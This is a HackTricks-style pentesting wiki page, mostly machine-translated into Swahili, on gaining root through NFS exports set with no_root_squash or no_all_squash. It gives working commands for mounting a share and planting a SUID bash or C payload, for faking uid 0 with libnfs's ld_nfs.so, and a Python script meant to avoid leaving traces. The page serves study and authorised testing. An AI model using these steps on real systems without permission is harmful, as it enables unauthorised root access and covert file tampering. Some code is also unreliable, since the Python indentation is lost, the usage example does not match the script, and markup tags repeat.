{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Soma _ **/etc/exports** _ faili, ikiwa unapata directory ambayo imewekwa kama **no\_root\_squash**, basi unaweza **kufikia** hiyo kutoka **kama mteja** na **kuandika ndani** ya hiyo directory **kama** ungekuwa **root** wa mashine hiyo.

**no\_root\_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji root kwenye mteja kufikia faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari kubwa za usalama.

**no\_all\_squash:** Hii ni sawa na chaguo la **no\_root\_squash** lakini inatumika kwa **watumiaji wasiokuwa root**. Fikiria, una shell kama mtumiaji nobody; umeangalia faili ya /etc/exports; chaguo la no\_all\_squash lipo; angalia faili ya /etc/passwd; fanya kama mtumiaji asiye root; tengeneza faili la suid kama mtumiaji huyo (kwa kuunganisha kwa kutumia nfs). Tekeleza suid kama mtumiaji nobody na kuwa mtumiaji tofauti.

# Privilege Escalation

## Remote Exploit

Ikiwa umepata udhaifu huu, unaweza kuutumia:

* **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyounganishwa **/bin/bash** binary na kumpa haki za **SUID**, na **kutekeleza kutoka kwa mashine** ya mwathirika hiyo bash binary.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyowekwa payload yetu iliyotengenezwa ambayo itatumia ruhusa ya SUID, itapeleka **SUID** haki, na **kuendesha kutoka kwa** mashine ya mwathirika hiyo binary (unaweza kupata hapa baadhi ya [C SUID payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwa mashine yako hadi mashine ya mwathirika unaweza bado kutumia toleo la Remote kutekeleza kupanda kwa haki hii kwa kutunga bandari zinazohitajika**.\
Trick ifuatayo ni katika kesi faili `/etc/exports` **inaonyesha IP**. Katika kesi hii **hutoweza kutumia** kwa njia yoyote **exploit ya mbali** na utahitaji **kudhulumu hila hii**.\
Sharti lingine muhimu ili exploit ifanye kazi ni kwamba **export ndani ya `/etc/export`** **lazima litumie bendera `insecure`**.\
\--_Sijui kama `/etc/export` inaonyesha anwani ya IP hila hii itafanya kazi_--
{% endhint %}

## Basic Information

Hali hii inahusisha kutumia faida ya NFS iliyowekwa kwenye mashine ya ndani, ikitumia kasoro katika spesifikesheni ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, ambayo inaweza kuwezesha ufikiaji usioidhinishwa. Kutekeleza kunahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kutunga wito wa NFS RPC.

### Compiling the Library

Hatua za ukusanyaji wa maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, syscalls za fallocate zilikuwa zimeandikwa nje. Mchakato wa ukusanyaji unajumuisha amri zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Conducting the Exploit

The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:

1. **Compile the exploit code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Place the exploit on the share and modify its permissions by faking the uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Execute the exploit to gain root privileges:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell for Stealthy File Access
Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Kimbia kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
